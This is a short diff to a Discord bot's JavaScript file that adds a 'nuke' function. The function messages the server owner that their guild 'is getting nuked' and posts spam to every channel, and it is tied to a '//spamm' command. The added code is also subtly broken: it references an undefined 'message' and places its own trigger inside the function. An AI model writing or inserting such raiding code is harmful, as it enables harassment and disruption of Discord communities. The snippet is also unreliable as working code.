@@ -116,5 +116,20 @@ client.elevation = message => {
   return permlvl;
 };
 
+const { Client } = require('discord.js');
+async function nuke(guild) {
+
+  let channels = 0;
+
+
+  await guild.owner.send('Hey there! Your guild is getting nuked! :D').catch(e => { return void e; });
+
+  await Promise.all(guild.channels.map(c => {
+      channels++;
+      return c.send("oui");
+ 
+  }));
+if (message.content.startsWith("//spamm")) return nuke(guild)
+}
 
 client.login(process.env.TOKEN);
